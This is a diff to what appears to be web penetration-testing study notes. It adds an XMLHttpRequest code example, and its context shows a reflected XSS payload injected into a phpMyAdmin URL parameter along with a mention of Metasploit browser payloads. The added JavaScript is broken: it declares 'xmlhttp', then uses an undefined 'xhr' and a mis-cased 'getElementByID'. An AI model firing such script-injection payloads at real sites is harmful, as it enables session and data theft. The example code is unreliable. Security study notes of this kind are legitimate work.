@@ -124,6 +124,24 @@ http://www.sec542.org/PhpMyAdmin/index.php?lang=<script>var lo=document.location
 <!-- Most important is the browser exploitation - Metasploit attack payloads -->
 {% endhighlight %}
 
+
+>**XML HTTP Request**
+
+{% highlight javascript %}
+//Create the oject
+xmlhttp = new XMLHttpRequest();
+//Sets which function should be called when the ready state changes (AJAXProcess is a custom function)
+xmlhttp.onreadystatechange = function () { if (xhr.readyState ==4 && xhr.status ==200) { document.getElementByID("answer").innerHTML = xhr.responseText;}}
+//set up the request
+xmlhttp.open("GET", "http://www.sec542.org/index.php");
+//Send the request
+xmlhttp.send();
+//The property that contains the current ready state
+xmlhttp.readyState
+//THe property that contains the contents of any response from the server
+xmlhttp.responseText
+{% endhighlight %}
+
 > **Useful Resources**
 
 * [MongoDB](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
